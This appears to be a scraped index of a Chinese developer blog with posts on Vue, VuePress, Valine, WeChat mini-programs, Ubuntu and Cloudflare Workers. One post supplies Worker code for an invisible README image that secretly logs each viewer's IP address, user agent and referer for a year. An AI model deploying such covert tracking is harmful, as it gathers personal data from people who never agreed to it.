const { appId, appKey, notify, verify, placeholder, avatar = 'mm', avatarForce = false, meta = ['nick', 'mail', 'link'], pageSize = 10, visitor = false, highlight = true, recordIp = false, jsUrl } = this.props; if (!appId || !appKey) { return &lt;div class=&quot;notification is-danger&quot;&gt; You forgot to set the &lt;code&gt;app_id&lt;/code&gt; or &lt;code&gt;app_key&lt;/code&gt; for Valine. Please set it in &lt;code&gt;_config.yml&lt;/code&gt;. &lt;/div&gt;; } const js = `new Valine({ el: '#valine-thread' , notify: ${notify}, verify: ${verify}, appId: '${appId}', appKey: '${appKey}', placeholder: '${placeholder}', avatar: '${avatar}', avatarForce: ${avatarForce}, meta: ${JSON.stringify(meta)}, pageSize: ${pageSize}, visitor: ${visitor}, highlight: ${highlight}, recordIP: ${recordIp} });`; return &lt;Fragment&gt; &lt;div id=&quot;valine-thread&quot; class=&quot;content&quot;&gt;&lt;/div&gt; &lt;script src=&quot;//cdn1.lncld.net/static/js/3.0.4/av-min.js&quot;&gt;&lt;/script&gt; &lt;script src={jsUrl}&gt;&lt;/script&gt; &lt;script dangerouslySetInnerHTML={{ __html: js }}&gt;&lt;/script&gt; &lt;/Fragment&gt;; }}/** * Cacheable Valine comment JSX component. * &lt;p&gt; * This class is supposed to be used in combination with the &lt;code&gt;locals&lt;/code&gt; hexo filter * ({@link module:hexo/filter/locals}). * * @see module:util/cache.cacheComponent * @example * &lt;Valine.Cacheable * comment={{ * app_id=&quot;******&quot; * app_key=&quot;******&quot; * notify={false} * verify={false} * placeholder=&quot;******&quot; * avatar=&quot;mm&quot; * avatar_force={false} * meta={['nick', 'mail', 'link']} * page_size={10} * visitor={false} * highlight={true} * record_ip={false} * }} * helper={{ cdn: function() {...} }} /&gt; */Valine.Cacheable = cacheComponent(Valine, 'comment.valine', props =&gt; { const { comment, helper } = props; return { appId: comment.app_id, appKey: comment.app_key, notify: comment.notify, verify: comment.verify, placeholder: comment.placeholder, avatar: comment.avatar, avatarForce: comment.avatar_force, meta: comment.meta, pageSize: comment.page_size, visitor: comment.visitor, highlight: comment.highlight, recordIp: comment.record_ip, jsUrl: 'https://cdn.jsdelivr.net/gh/imaegoo/Valine@1.3.10.1/dist/Valine.min.js' };});module.exports = Valine; 如果你用的是其他主题，你可以自己查找 Valine.min.js 的引入位置，替换成：https://cdn.jsdelivr.net/gh/imaegoo/Valine@1.3.10.1/dist/Valine.min.js 拓展阅读 Valine 1.4.6+ 新增必填项设置 - https://valine.js.org/configuration.html#requiredFields pure主题valine留言板添加：昵称、邮箱必填必写功能 - https://blog.gobyte.cn/post/e56fdb88.html","link":"/2020/valine-nick-mail-required/"},{"title":"腾讯云云开发云函数 之 代码共用","text":"腾讯云云开发云函数的文档中写道—— 不同的云函数可以共用代码文件（目录）吗未上线 如果是简单的云函数，这一点还能接受，在开发 Twikoo 评论系统的过程中，云函数要实现的 API 越来越多，逐渐让我发现了它的弊端： 大量的代码复制！ 版本管理非常不便！ 依赖管理非常不便！ 一次要部署十来个云函数，很麻烦！ 每个云函数都有独立的冷启动时间，很慢！ 显然违反了开发的 DRY 原则，这迫使我开始思考解决方案。 正常的思维是，一个 API 写一个云函数，如果将云函数合并，用一个云函数实现不同的功能，能否解决这样的问题呢？ 可以！ 经过改造后的云函数，只保留了一个云函数入口点，通过传入 event，来调用不同的分功能，不同的功能也终于可以复用代码了。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546// 云函数入口点 / entry pointexports.main = async (event, context) =&gt; { let res = {} await readConfig() try { switch (event.event) { case 'GET_FUNC_VERSION': res = getFuncVersion() break case 'COMMENT_GET': res = await commentGet(event) break case 'COMMENT_LIKE': res = await commentLike(event) break case 'COMMENT_SUBMIT': res = await commentSubmit(event) break case 'COUNTER_GET': res = await counterGet(event) break case 'GET_PASSWORD_STATUS': res = await getPasswordStatus() break case 'SET_PASSWORD': res = await setPassword(event.password) break case 'SET_CONFIG': res = await setConfig(event) break case 'LOGIN': res = await login(event.password) break default: res.code = RES_CODE.EVENT_NOT_EXIST res.message = '请更新 Twikoo 云函数至最新版本' } } catch (e) { console.error('Twikoo 遇到错误，请参考以下错误信息。如有疑问，请反馈至 https://github.com/imaegoo/twikoo/issues') console.error('请求参数：', event) console.error('错误信息：', e) res.code = RES_CODE.FAIL res.message = e.message } return res}","link":"/2020/tcb-functions-dry/"},{"title":"Valine 1.4 如何保护评论者的邮箱和 IP","text":"前言AyagawaSeirin 提出了一个 Valine 隐私安全漏洞，发送请求中响应内容明文暴露评论者IP、邮箱等隐私内容，所以我就去查了一下 LeanCloud 文档，发现可以手动更改字段权限，但是，如果设置 mail 客户端不可见，将不会显示评论者的 Gravatar，转为显示默认头像，因为原版是取到明文邮箱后再转 MD5 取头像的。想到的解决办法是新增一个可见字段存储 mail 的 MD5，需要改 Valine 源码，还需要处理现有数据。 以下是我实现的魔改版本，基于 Valine.min.js 版本 1.4.14 修改。该魔改版新增一个可见字段（mailMd5）存储 mail 的 MD5，并提供了脚本处理现有评论数据。 Github 用法 访问 LeanCloud 控制台 &gt; 存储 &gt; 结构化数据 选择 Comment Class，分别点击 mail 和 ip 相应字段的下拉菜单，选择编辑 勾选”客户端不可见”后，客户端发起查询的时候，返回的结果将不包含这个字段* 即使用 AppKey 指定字段名查询，也不会返回字段值，足够安全。 请同样确认 class 的权限配置 克隆本仓库 12345# 克隆git clone -b imaegoo/1.4.14 https://github.com/imaegoo/Valine.git valinecd valine# 安装依赖npm install 打开 migrate.js，修改里面的 appId，appKey，masterKey，serverURL 为自己的 执行脚本 1node migrate.js 替换博客的 Valine.min.js 为本仓库到 valine.js，可以使用 CDN 地址：https://cdn.jsdelivr.net/npm/@imaegoo/valine@1.4.1-4.1/valine.min.js 测试一下，头像是否正常加载，API 是否没有返回 mail 和 ip 改动如果你对魔改版感到不放心，可以检查检查我都改了些啥","link":"/2020/valine-private/"},{"title":"多种方式解决 Windows CMD 中 vue-cli-service 不是内部或外部命令","text":"前提已安装 Vue 脚手架 1npm install -g @vue/cli 现象找不到 vue-cli-service 命令 1'vue-cli-service' is not recognized as an internal or external command, operable program or batch file. 经过搜索，发现这个问题只在 Windows 下存在。 装了脚手架应该会在 node 目录产生 vue-cli-service.cmd 的文件，实际没有产生，不过在全局 node_modules 下是有的。 有说清理 node_modules 重新安装可以解决的，试了不管用，全局卸载脚手架重新安装也不管用，就算管用也比较麻烦，于是我找到了几个间接使用方法—— 方法1 - npm run在 package.json 中配置启动命令 package.json12345{ &quot;scripts&quot;: { &quot;serve&quot;: &quot;vue-cli-service serve&quot; }} 然后使用 npm run serve 来代替 vue-cli-service serve 方法2 - npx命令前加 npx，如 12npx vue-cli-service servenpx vue-cli-service test:unit 更多关于 npx 介绍见——https://www.ruanyifeng.com/blog/2019/02/npx.html 方法3 - vue ui 启动图形界面 1vue ui 访问 http://localhost:8000/ 选择项目文件夹，点任务 - 运行","link":"/2020/vue-cli-service-is-not-recognized/"},{"title":"Vue 给 i18n 国际化组件写单元测试报 $t is not a function","text":"对一个有国际化的 Vue 组件写单元测试，mount这个组件时，会遇到找不到 $t 的报错。 Component template1&lt;p&gt;{{ $t('message.hello' }}&lt;/p&gt; 1TypeError: _vm.$t is not a function Vue 节点上没有 $t，先尝试挂载？ Component.spec.js12import VueI18n from 'vue-i18n'Vue.use(VueI18n) 结果会遇到另一个相似的错误。 1TypeError: Cannot read property '_t' of undefined 我们的 Test Case 不需要测到国际化字符串，那就 mock 一个 $t 好了。 Component.spec.js12345shallowMount(Component, { methods: { $t: () =&gt; '' }}) 测试就通过了。 相关插件版本号： package.json12345678{ &quot;dependencies&quot;: { &quot;vue-i18n&quot;: &quot;^8.14.1&quot; }, &quot;devDependencies&quot;: { &quot;@vue/cli-plugin-unit-jest&quot;: &quot;^4.1.2&quot;, }}","link":"/2020/vue-i18n-unit-test/"},{"title":"Vue Router 向 URL query 添加、删除参数","text":"添加一个参数当前 URL：http://localhost/home?keyword=example 1this.$router.replace({ query: { ...this.$route.query, code: '1' } }) 最终 URL：http://localhost/home?keyword=example&amp;code=1 删除一个参数我所使用的 Vue Router 版本为 3.0.3，删除参数比较麻烦。 当前 URL：http://localhost/home?keyword=example&amp;code=1 无效方法12delete this.$route.query.codethis.$router.replace({ query: this.$route.query }) // 地址栏无反应 有效方法1234let newQuery = JSON.parse(JSON.stringify(this.$route.query)) // 深拷贝delete newQuery.code// 如果有引入 lodash, 可以写成: let newQuery = _.omit(this.$route.query, 'code')this.$router.replace({ query: newQuery }) 最终 URL：http://localhost/home?keyword=example 后记使用 this.$router.replace() 以及 this.$router.push() 时，地址栏变化是有延后的，且这个延后无法通过 this.$nextTick() 预测。 以下场景：微信 OAuth 回跳到我们的页面时，会在 URL 追加 code 参数用于认证，我们成功获得 code 后想要从地址栏去掉它，同时还要配置微信 JS SDK。配置微信 JS SDK 需要当前页面地址（window.location.href.split('#')[0]），而我们去掉 code 会导致地址改变。地址栏实际改变完成的时间是不可预测的，而配置微信 JS SDK 有成功回调，所以需要先配置微信 JS SDK，再处理地址栏。 参考资料：https://stackoverflow.com/questions/48700584/vuejs-how-to-remove-parameter-from-url","link":"/2020/vue-remove-query-from-router/"},{"title":"VuePress 自定义默认主题页眉页脚","text":"方式添加 2 个文件 .vuepress/theme/index.js123module.exports = { extend: '@vuepress/theme-default'} .vuepress/theme/layouts/Layout.vue123456789101112131415161718192021222324252627&lt;template&gt; &lt;ParentLayout&gt; &lt;template #sidebar-top&gt; &lt;div&gt;My custom sidebar-top&lt;/div&gt; &lt;/template&gt; &lt;template #sidebar-bottom&gt; &lt;div&gt;My custom sidebar-bottom&lt;/div&gt; &lt;/template&gt; &lt;template #page-top&gt; &lt;div&gt;My custom page-top&lt;/div&gt; &lt;/template&gt; &lt;template #page-bottom&gt; &lt;div&gt;My custom page-bottom&lt;/div&gt; &lt;/template&gt; &lt;/ParentLayout&gt;&lt;/template&gt;&lt;script&gt;import ParentLayout from '@parent-theme/layouts/Layout.vue'export default { name: 'Layout', components: { ParentLayout }}&lt;/script&gt; 效果 适用版本vuepress v1.5.4 Global Footer in Default Theme #339","link":"/2020/vuepress-default-theme-slot/"},{"title":"VuePress 密码加密文章","text":"前言事情的起因是，我需要一个存放未分类整理知识点，以及收藏转载文章的私人知识库，和 iMaeGoo’s Blog 区别开来。 我尝试过简书、语雀、Evernote、OneNote、有道云笔记，对它们的 markdown 支持、导出能力、搜索能力、容量、安全性都有体会。 最后我决定建一个私人 Git 仓库，用 markdown 来记笔记。然后通过 CI/CD 自动构建到一个叫 iMaeGoo’s Diary 的 VuePress 网站。写笔记 Notepad + Git 就能搞定，还能自由选择多种多样的 markdown 编辑器，手机端也可以通过在线 IDE 更新内容，VuePress 的搜索非常好用，安全性也完全在自己的掌控范围之内。 反正是知识库嘛，我配置了完全公开，方便自己随时随地查看，但由于是未经整理的知识库，也不建议访客去看啦。 问题就来了，有些笔记包含了敏感信息，怎么在公开的知识库中保护这类信息？ 在寻找 VuePress 加密时，我发现了 vuepress-plugin-encrypt 这个好用的插件，使用了 aes-128-ctr 来加密内容，你可以直接查看它的英文官方文档。 效果 开始使用 在 VuePress 的项目中安装这个插件 command1yarn add -D @oak-tree-house/vuepress-plugin-encrypt 修改配置文件启用插件 .vuepress/config.js12345module.exports = { plugins: [ ['@oak-tree-house/encrypt'] ]} 修改 package.json 增加加解密的命令 package.json123456{ &quot;scripts&quot;: { &quot;decrypt&quot;: &quot;encrypt decrypt --source-dir &lt;YOUR_SOURCE_DIR&gt; --key-file keys.json --temp .temp-encrypt&quot;, &quot;encrypt&quot;: &quot;encrypt encrypt --source-dir &lt;YOUR_SOURCE_DIR&gt; --key-file keys.json --temp .temp-encrypt&quot; }} * 此处基于官方 doc 有改动，命令参数 encrypt 和 decrypt 需要放在最前，否则会遇到错误 error: unknown option '--source-dir'4. 把临时目录添加到 .gitignore 列表 .gitignore12/keys.json/.temp-encrypt * 如果你的是安全的私有 Git 仓库，想一起提交密码文件，可以不 ignore /keys.json5. 新建密码文件 keys.json keys.json123456{ &quot;user&quot;: &quot;imaegoo&quot;, &quot;keys&quot;: { &quot;key&quot;: &quot;mypassword&quot; }} 尝试写一段需要加密的内容 markdown1234## test::: encrypt key=key owners=imaegoomy password is helloworld::: 运行 yarn encrypt，你将会发现上一步的内容被自动替换成密文 markdown12345## test::: encrypt encrypted key=key owners=imaegooZpDkUuyB2+O7/Ga9InossDwIYJVn3I6VbdlNLxiJaU/gCDxnC1kQcgbzC9RqVCZ3ru6fpf3B5wnjKKSR1/miaLoxP4WrCnlYTiL0AeAeLPW0bN+3KqBg2n+fTCqubEFfRZnbKUGvsuZai0vRSW4OYmirew**::: 大功告成，运行 VuePress 开发模式，测试一下吧！ 配置最新的完整配置参见官方文档 .vuepress/config.js123456789101112131415module.exports = { plugins: [ ['@oak-tree-house/encrypt', { contentTitle: 'Encrypted Content', unencryptedText: 'The content is shown below. It should be encrypted when published.', encryptedText: 'This part of content is encrypted. To view it, you need to enter the correct key in the input field below.', decryptedText: 'The encrypted content is successfully decrypted and shown below.', decryptButtonText: 'Decrypt', decryptFailText: 'Failed to decrypt!', unencryptedIcon: undefined, encryptedIcon: undefined, decryptedIcon: undefined }] ]} 本文部分内容来自 https://szp15.com/2020/02/04/plugin-encrypt-doc/，采用 MIT License","link":"/2020/vuepress-encrypt/"},{"title":"无需开发&#x2F;体验权限，获取任意微信小程序卡片页面路径","text":"背景工作上正在开发的一款小程序，需要链接到京东购物的一个活动页面。经过搜索发现，除了在小程序内嵌 Webview，小程序内不能直接跳转一个网页，但是京东也是有自己的小程序的，我们可以跳转到京东的小程序吗？查找文档发现可以用 wx.navigateToMiniProgram 打开另一个小程序。 1234wx.navigateToMiniProgram({ appId: '', // 要打开的小程序 appId path: '' // 打开的页面路径，如果为空则打开首页}) 现在需要的就是京东小程序的 appId 和活动页面的 path 了！ 一番操作后，我发现微信 APP 上既不能获取到小程序的 appId 也不能获取到活动页面的 path，若要获得这两样东西，得开启调试才行，想开启调试，至少要成为小程序开发者…… 京东小程序的开发者，我怎么可能拿得到嘛，我连他们的开发者都接触不到！ 前提小程序页面至少是可分享的，如果是配置成完全不可分享的小程序，此方法不可用。 方法拿“抽奖助手”小程序做例子吧。 打开微信网页版； 登录后，打开 F12 网页调试，到 Network 标签下； 在手机端将小程序分享给任意好友； 在 Network 标签下会看到 POST https://wx.qq.com/cgi-bin/mmwebwx-bin/webwxsync 的请求； 查看 response 是一个 JSON 字符串； 展开到 AddMsgList[0].Content，看到一个转义的 XML 字符串； 解码后，得到原始消息 XML； 查找 &lt;weappinfo&gt;，找到类似下面的这一段数据； 123456789101112131415&lt;weappinfo&gt; &lt;pagepath&gt;&lt;![CDATA[pages/lucky/lottery/detail.html?id=80018XBB8Mn&amp;home=1]]&gt;&lt;/pagepath&gt; &lt;username&gt;&lt;/username&gt; &lt;appid&gt;wx01bb1ef166cd3f4e&lt;/appid&gt; &lt;version&gt;732&lt;/version&gt; &lt;type&gt;2&lt;/type&gt; &lt;weappiconurl&gt;&lt;![CDATA[http://wx.qlogo.cn/mmhead/Q3auHgzwzM6pjwC2de3qEMiaIunrq5WWEdFWlaYBYvhoQPVEA1SfaBw/96]]&gt;&lt;/weappiconurl&gt; &lt;shareId&gt;&lt;![CDATA[1_wx01bb1ef166cd3f4e_bd399ef25a9defc93c73fb3cacacacd3_1600911693_0]]&gt;&lt;/shareId&gt; &lt;appservicetype&gt;0&lt;/appservicetype&gt; &lt;videopageinfo&gt; &lt;thumbwidth&gt;720&lt;/thumbwidth&gt; &lt;thumbheight&gt;576&lt;/thumbheight&gt; &lt;fromopensdk&gt;0&lt;/fromopensdk&gt; &lt;/videopageinfo&gt;&lt;/weappinfo&gt; 其中“wx01bb1ef166cd3f4e”即为我们要找的 appId其中“pages/lucky/lottery/detail.html?id=80018XBB8Mn&amp;home=1”删除里面的 .html 后，即为我们要找的 path","link":"/2020/weixin-miniprogram-get-path/"},{"title":"Vue.js 做一个大屏幕抽奖","text":"在 Github 上面搜索 “lottery”，发现类似的项目挺多的，有 Electron 实现的，可以打包成 exe，也有原生 js 实现的，浏览器打开。 这次是用 Vue 做了一个编号抽奖，一个转盘抽奖，放在一起，练手。 预览：http://lottery.imaegoo.com/ 编号抽奖编号抽奖实现起来非常简单，存一个号码池，存一个抽奖历史，从号码池中过滤掉已中奖的号码，从剩下的号码随机出一个就可以了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384&lt;template&gt; &lt;div class=&quot;lottery&quot;&gt; &lt;div class=&quot;current&quot;&gt;{{ current }}&lt;/div&gt; &lt;button class=&quot;button is-large is-warning&quot; v-if=&quot;!timer&quot; @click=&quot;start&quot;&gt;开始&lt;/button&gt; &lt;button class=&quot;button is-large is-danger&quot; v-if=&quot;timer&quot; @click=&quot;stop&quot;&gt;停&lt;/button&gt; &lt;table class=&quot;table&quot; v-if=&quot;history.length &gt; 0&quot;&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;轮次&lt;/th&gt; &lt;th&gt;中奖号码&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &lt;tr v-for=&quot;(item, index) in history&quot; :key=&quot;index&quot;&gt; &lt;td&gt;{{ index + 1 }}&lt;/td&gt; &lt;td&gt;{{ item }}&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; &lt;/table&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default { data () { return { numbers: [], current: '', timer: null, history: [] } }, computed: { neverWin () { return this.numbers.filter((item) =&gt; !this.history.some((historyItem) =&gt; historyItem === item)) } }, methods: { random (minNum, maxNum) { return parseInt(Math.random() * (maxNum - minNum + 1) + minNum) }, start () { if (this.neverWin.length &lt; 1) { alert('所有人都已中过奖! 请到设置清空中奖纪录!') return } this.timer = setInterval(this.refresh, 100) }, stop () { clearInterval(this.timer) this.timer = null this.saveHistory() }, refresh () { let next do { next = this.neverWin[this.random(0, this.neverWin.length - 1)] } while (this.current === next) // 避免同数值被连续刷到 this.current = next }, saveHistory () { this.history.push(this.current) localStorage.setItem('history', JSON.stringify(this.history)) }, readNumbers () { const numStr = localStorage.getItem(&quot;numbers&quot;) if (numStr) this.numbers = numStr.split('\\n').filter((item) =&gt; !!item) if (this.numbers.length === 0) { alert('抽奖池为空! 请到右上角设置中添加!') this.numbers = ['11', '22', '33', '44', '55', '66', '77', '88', '99'] } }, readHistory () { const history = localStorage.getItem(&quot;history&quot;) if (history) this.history = JSON.parse(history) } }, mounted () { this.readNumbers() this.readHistory() this.current = this.numbers[0].split('').map(() =&gt; '*').join('') }}&lt;/script&gt; 转盘抽奖转盘抽奖稍微复杂一点： 随机抽一个目标奖项 计算得出到这个奖项的转动角度（这里的角度我也是在区间中随机取，看上去更真实） 加上（360° × 转多少圈） 绑定到转盘图片的 transform 上 设置旋转动画 transition: transform 5s; 做完之后发现也不是很难。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596&lt;template&gt; &lt;div class=&quot;rotate&quot;&gt; &lt;div class=&quot;arrow&quot;&gt; &lt;img class=&quot;wheel&quot; src=&quot;../assets/wheel.png&quot; :style=&quot;{transform: `rotate(${currentAngle}deg)`}&quot; /&gt; &lt;div class=&quot;pointer&quot; @click=&quot;startArrow&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;text&quot; v-if=&quot;currentAward&quot;&gt;{{ currentAward }}&lt;/div&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;const awards = [ '侯校长发红包', // 30% '工作日不扣工资，休息一天', // 10% '与黄书记共进晚餐', // 10% '工作日不扣工资，休息半天', // 10% '教研组最美（最帅）的人请喝奶茶', // 15% '跟校长们合张影' // 25%]export default { props: { msg: String }, data() { return { currentAngle: 0, times: 0, currentAward: '等待抽奖' } }, methods: { startArrow() { if (this.currentAward === '正在抽奖') return let award = this.getAward() this.getAngle(award) this.setCurrentAward(award) }, getAward() { let randomNum = Math.random() if (randomNum &lt; 0.3) { return 0 } else if (randomNum &lt; 0.4) { return 1 } else if (randomNum &lt; 0.5) { return 2 } else if (randomNum &lt; 0.6) { return 3 } else if (randomNum &lt; 0.75) { return 4 } else if (randomNum &lt;= 1) { return 5 } }, getAngle(award) { this.times++ let max = (award + 1) * 60 let min = award * 60 let angle = parseInt(Math.random() * (max - min + 1) + min, 10) this.currentAngle = 360 * (this.times * 7) + angle }, setCurrentAward(award) { this.currentAward = '正在抽奖' setTimeout(() =&gt; { this.currentAward = `恭喜中奖：${awards[award]}` }, 5000) } }}&lt;/script&gt;&lt;style scoped&gt;.arrow { position: relative;}.wheel { transition: transform 5s;}.pointer { background-repeat: no-repeat; background-position: center; background-image: url('../assets/arrow.png'); content: ''; top: 0; left: 0; right: 0; bottom: 0; position: absolute;}.text { margin-top: 20px; font-size: 26px; font-weight: bold;}&lt;/style&gt; 指针 arrow.png 和转盘 wheel.png 两张图片可以在 https://github.com/imaegoo/lottery/tree/zhengzhou/src/assets 找到。 路由反正只有4个页面，直接自己写一个 tab 切换，没有引入 vue-router。 UI框架功能太简单也用不到，只用了一个 Bulma。啊~ 轻量又好用的 Bulma~ 总结源码放在了 https://github.com/imaegoo/lottery 上面。 设计、切图、编码、测试总共花了6小时，嗯，挺简单的。","link":"/2020/vue-lottery/"},{"title":"解决微信小程序在 iPhone iOS 上 text 宽度只有一半导致的不居中等种种问题","text":"现象当小程序中使用第三方字体时，在 iPhone 11 和 iPhone 12 机型下 中文字正常 英文字和数字，居中和右对齐异常 这个问题只能在几个特定的机型下出现，不用第三方字体也没有这个问题，安卓机型和开发者工具也重现不了，甚至 iPhone 12 mini 用同一版本也不能重现。 微信版本：7.0.18小程序基础库：2.14.0iOS：14.2 这未免也太奇怪了。 代码代码片段地址：https://developers.weixin.qq.com/s/wgOVEgmQ7Cmz wxml123456789101112&lt;view class=&quot;page&quot; wx-if=&quot;{{ ready }}&quot;&gt; &lt;view class=&quot;text-left&quot;&gt;左对齐文本&lt;/view&gt; &lt;view class=&quot;text-center&quot;&gt;居中文本&lt;/view&gt; &lt;view class=&quot;text-right&quot;&gt;右对齐文本&lt;/view&gt; &lt;view class=&quot;text-left&quot;&gt;Left&lt;/view&gt; &lt;view class=&quot;text-center&quot;&gt;Center&lt;/view&gt; &lt;view class=&quot;text-right&quot;&gt;Right&lt;/view&gt; &lt;view class=&quot;text-left&quot;&gt;123&lt;/view&gt; &lt;view class=&quot;text-center&quot;&gt;456&lt;/view&gt; &lt;view class=&quot;text-right&quot;&gt;789&lt;/view&gt; &lt;view class=&quot;center-line&quot;&gt;&lt;/view&gt;&lt;/view&gt; js12345678910111213141516Page({ data: { ready: false }, onLoad () { wx.loadFontFace({ global: true, family: 'FZZhunYuan-M02S', source: 'url(&quot;http://localhost:9000/FZZhunYuan.ttf&quot;)', complete: (res) =&gt; { console.log('loading font status: ' + res.status) this.setData({ ready: true }) } }) }}) wxss123456789101112131415161718192021222324252627282930.page { display: flex; flex-direction: column; font-family: 'FZZhunYuan-M02S';}.center-line { position: absolute; left: 50vw; width: 1px; height: 100vh; background-color: #ff0000;}.text-left,.text-center,.text-right { width: 80%; display: flex; background-color: #cccccc; margin: 20rpx auto; font-size: 50rpx;}.text-left { justify-content: flex-start;}.text-center { justify-content: center;}.text-right { justify-content: flex-end;} 分析使用微信开发者工具真机调试功能，发现 text 的宽度只有正常的一半宽度，尝试设置 text 的宽度，因为 text 属于 inline 元素，所以没有效果…… 于是乎，想到既然中文字正常，那我们只要在英文字中加入中文字符，是不是能解决问题呢？ 解决办法如果想让文字居中，就在文字左右各加一个全角空格“ ”如果想让文字右对齐，就在文字右边加一个全角空格“ ” 其实就是，只要让文本不全是英文和数字，就不会出现问题。 (⊙﹏⊙)……说是解决办法，其实是一个 workaround，等着官方修复吧…… 社区相应的 bug：https://developers.weixin.qq.com/community/develop/doc/0006cc3bd7056063605b97a2353c00","link":"/2020/weixin-miniprogram-ios-text-width-bug/"},{"title":"关闭 Ubuntu 20 桌面版动画，使应用程序菜单不再卡顿","text":"Ubuntu Desktop 应用程序菜单带有从屏幕底角到屏幕中心的动画。虽然这看起来很酷，但我感觉它很卡，优化很差，尤其是在集成显卡和虚拟机的环境中。如果你的想法和我一样，有一种方法可以关闭此动画，从而可以更快地从“应用程序”菜单中启动应用程序。 打开“终端” 执行以下命令，关闭动画，立即生效 1gsettings set org.gnome.desktop.interface enable-animations false 想要重新开启动画，只需要执行 1gsettings set org.gnome.desktop.interface enable-animations true 看看百度的答案都是些啥，还需要安装 compizconfig-settings-manager，其实一行命令就解决啦。","link":"/2021/disable-ubuntu-animation/"},{"title":"Base64 在线文本加解密工具","text":"Base64 在线加解密工具，纯前端。 之所以写这个是因为网上的同类工具要么离不开后端操作，要么广告一堆，用着不顺手。 简单一点。 输入文本 加密 解密 加密 / 解密结果 function encrypt (decrypt, event) { var base64req = $('#text-plain').val(); var base64res; try { if (decrypt) { base64res = decodeuint8arr(base64js.toByteArray(base64req)); } else { base64res = base64js.fromByteArray(encodeuint8arr(base64req)); } } catch (e) { base64res = e.message; } $('#text-encrypted').val(base64res); } function decodeuint8arr (uint8array) { return new TextDecoder('utf-8').decode(uint8array); } function encodeuint8arr (myString) { return new TextEncoder('utf-8').encode(myString); } 相关代码12345678910111213141516171819202122// &lt;script src=&quot;https://cdn.jsdelivr.net/npm/base64-js@1.5.1/base64js.min.js&quot;&gt;&lt;/script&gt;function encrypt (decrypt, event) { var base64req = $('#text-plain').val(); var base64res; try { if (decrypt) { base64res = decodeuint8arr(base64js.toByteArray(base64req)); } else { base64res = base64js.fromByteArray(encodeuint8arr(base64req)); } } catch (e) { base64res = e.message; } $('#text-encrypted').val(base64res);}function decodeuint8arr (uint8array) { return new TextDecoder('utf-8').decode(uint8array);}function encodeuint8arr (myString) { return new TextEncoder('utf-8').encode(myString);}","link":"/2021/base64-tool/"},{"title":"在线工具 - 银行从业资格考试个人理财计算器网页版","text":"银行从业资格考试考前练习需要用到理财计算器。搜索了一圈百度，找不到和考场同款的计算器，类似的工具都做成了 APP，我不想为此再下载一个 APP，于是就有了此计算器。 暂时还没有适配手机浏览器，有时间会适配一下。 已经适配手机浏览器啦！ 博主已经考过啦！考场计算器与本页面的计算器是一模一样的！提示：点击输入框中右侧的按钮可以打开加减乘除计算器。 最后祝大家考试顺利！ .iframe-financial-calculator { border: none; max-width: 575px; width: 100%; height: 450px; } 模拟考场: https://demo.joytest.org/demo/t/ccbp20211023/1","link":"/2021/financial-calculator/"},{"title":"Cloudflare Worker 无服务器追查 Git 仓库代码泄露","text":"大部分 Git 平台，如 Github、Gitlab 等，会在打开仓库时自动渲染 README.md，而我们利用这一特性，通过对 README.md 中的图片访问日志加以记录，可以实现追查代码泄露的目的。 如果你还没有 Cloudflare 账号，可以申请一个。 登录 Cloudflare 后，进入 Workers 页面，点击 KV。 添加一个 Cloudflare KV，起名 ref，用于记录访问记录。 创建 Cloudflare Worker，起名 img，用于记录请求信息，并转发图片资源请求。 代码如下： 12345678910111213141516171819202122addEventListener('fetch', (event) =&gt; { event.respondWith(handleRequest(event.request));});async function handleRequest(request) { let response; if (request.url.slice(-4).toLowerCase() === '.png') { const ref = request.headers.get('referer'); if (ref) { const time = new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' }); const ip = request.headers.get('CF-Connecting-IP'); const ua = request.headers.get('User-Agent'); const key = `Referer: ${ref}`; const val = `时间: ${time}\\nIP: ${ip}\\nUA: ${ua}`; await REF.put(key, val, { expirationTtl: 60 * 60 * 24 * 365 }); } const redirect = new Request('https://cdn.jsdelivr.net/gh/imaegoo/image/1x1_ffffff00.png'); response = await fetch(redirect); } else { response = new Response('not found', { status: 404 }); } return response;} 将 KV ref 的命名空间绑定到 Worker img。 在仓库的 README.md 中插入图片 1![](https://img.imaegoo.workers.dev/image.png) 到 KV ref 中查看效果 利用同样的思路和方法，我们还可以追查网站文章未经授权的转载，试试看！","link":"/2021/git-tracking-image/"},{"title":"体验 VitePress：文档编译还能这么快！","text":"基于 VuePress 的项目文档的编译速度一直让我很苦恼，启动一次 dev server 要大约半分钟的时间，而且哪怕只有一个 Hello World，速度也是这么慢。相比之下，Hexo 都比它快。这当然不只是 VuePress 本身的问题，要说还得归咎于 Webpack。 于是 Vite 诞生了，一起诞生的还有 VitePress。好耶！虽然 VitePress 仍处于 WIP 阶段，告诉我们不要在任何地方使用，但我们可以提前对比一下，它究竟能比 VuePress 快多少？我们使用基于 VuePress 的 Twikoo 文档测试一下。 安装1yarn add -D vitepress 从 VuePress 迁移配置VitePress 中 themeConfig.sidebar 的配置，较 VuePress 有些不同，需要新建 .vitepress 目录，对原先的配置做一点点改动 .vuepress/config.js12345678910111213141516171819202122module.exports = { title: 'Twikoo 中文文档', description: 'Twikoo 中文文档', themeConfig: { sidebar: [ ['/', '简介'], '/quick-start', '/faq', '/api', '/link' ], lastUpdated: true, // 假定是 GitHub. 同时也可以是一个完整的 GitLab URL repo: 'imaegoo/twikoo', // 假如文档不是放在仓库的根目录下： docsDir: 'docs', // 假如文档放在一个特定的分支下： docsBranch: 'dev', // 默认是 false, 设置为 true 来启用 editLinks: true }} .vitepress/config.js123456789101112131415161718192021222324module.exports = { title: 'Twikoo 中文文档', description: 'Twikoo 中文文档', themeConfig: { sidebar: { '/': [ { text: '简介', link: '/' }, { text: '快速上手', link: '/quick-start' }, { text: '常见问题', link: '/faq' }, { text: 'API 文档', link: '/api' }, { text: '相关文档', link: '/link' }, ] }, lastUpdated: true, // 假定是 GitHub. 同时也可以是一个完整的 GitLab URL repo: 'imaegoo/twikoo', // 假如文档不是放在仓库的根目录下： docsDir: 'docs', // 